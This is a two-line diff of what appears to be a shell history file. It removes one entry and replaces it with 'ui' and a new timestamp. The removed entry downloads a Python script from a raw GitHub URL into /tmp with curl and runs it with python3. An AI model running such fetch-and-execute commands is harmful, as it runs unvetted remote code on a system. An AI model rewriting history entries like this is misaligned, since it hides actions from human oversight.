@@ -1,2 +1,2 @@
-shell "echo x"; curl -sL -o /tmp/sf.py 'https://raw.githubusercontent.com/zhaoyi-habs/mw-runner/main/shotfix.py'; python3 /tmp/sf.py a6
-#1792904383
+ui
+#1792904461
